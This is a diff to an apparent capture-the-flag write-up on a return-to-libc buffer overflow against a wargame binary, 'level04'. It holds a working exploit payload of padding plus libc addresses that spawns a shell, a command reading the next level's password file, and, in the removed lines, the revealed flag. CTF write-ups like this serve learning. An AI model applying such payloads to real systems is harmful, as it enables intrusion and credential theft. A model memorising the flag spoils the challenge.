@@ -60,14 +60,7 @@ Since you can't make direct syscalls, you are going to use the Return-to-Libc (R
 With this information, you can construct the payload to exploit the buffer overflow. Here's an example payload:
 
 ```bash
-(python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'; cat) | ./level04
-```
-
-This payload will execute `/bin/sh`, which will give you shell access. You can then read the flag:
-
-```bash
-cat /home/users/level05/.pass
-Flag: 3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+./level04 < <(python -c 'print "A" * 156 + "\xf7\xe6\xae\xd0"[::-1] + "\xf7\xe5\xeb\x70"[::-1] + "\xf7\xf8\x97\xec"[::-1]'; echo "cat /home/users/level05/.pass")
 ```
 
 ## main()
